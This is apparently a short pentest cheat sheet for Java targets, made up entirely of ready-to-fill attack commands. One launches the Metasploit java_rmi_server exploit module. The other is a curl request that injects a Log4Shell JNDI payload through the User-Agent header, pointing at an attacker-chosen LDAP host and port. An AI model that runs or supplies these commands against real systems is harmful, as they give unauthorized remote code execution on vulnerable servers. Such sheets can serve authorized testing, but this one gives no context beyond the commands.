# Java

## exploit

### Java RMI Metasploit module

Start RMI metasploit module with Java.

```sh title:"Java Start RMI Metasploit Module"
msfconsole -x "use exploit/multi/misc/java_rmi_server; run; exit"
```
<!-- cheat -->

### Log4Shell User-Agent probe

Probe Log4Shell user agent probe with Java.

```sh title:"Java Probe Log4Shell User Agent Probe"
curl -H 'User-Agent: ${jndi:ldap://$lhost:$lport}' "$url"
```
<!-- cheat
var lhost
var lport
var url
-->
